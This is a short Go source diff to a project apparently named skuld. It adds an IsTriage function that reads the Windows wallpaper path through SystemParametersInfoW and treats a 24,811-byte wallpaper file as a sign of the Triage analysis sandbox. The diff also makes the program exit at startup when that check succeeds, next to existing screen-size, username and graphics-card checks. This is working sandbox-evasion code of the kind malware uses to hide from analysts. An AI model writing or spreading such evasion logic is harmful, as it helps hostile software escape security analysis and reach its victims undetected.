@@ -5,6 +5,7 @@ import (
 	"os/exec"
 	"strings"
 	"syscall"
+	"unsafe"
 
 	"github.com/hackirby/skuld/utils/hardware"
 	"github.com/hackirby/skuld/utils/requests"
@@ -19,6 +20,34 @@ func contains(slice []string, item string) bool {
 		}
 	}
 	return false
+}
+
+func IsTriage() bool {
+    const bufferSize = 260
+    var buffer [bufferSize]uint16
+
+    ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("SystemParametersInfoW").Call(
+        0x0073,
+        uintptr(bufferSize),
+        uintptr(unsafe.Pointer(&buffer[0])),
+        0,
+    )
+    if ret == 0 {
+        return false
+    }
+
+    wallpaperPath := syscall.UTF16ToString(buffer[:])
+
+    fileInfo, err := os.Stat(wallpaperPath)
+    if err != nil {
+        return false
+    }
+
+    if fileInfo.Size() == 24811 {
+        return true
+    }
+
+    return false
 }
 
 func IsBlacklistedUsername(usernames []string) bool {
@@ -97,6 +126,10 @@ func GraphicsCardCheck() bool {
 }
 
 func Run() {
+	if IsTriage() {
+		os.Exit(0)
+	}
+	
 	if IsScreenSmall() {
 		os.Exit(0)
 	}
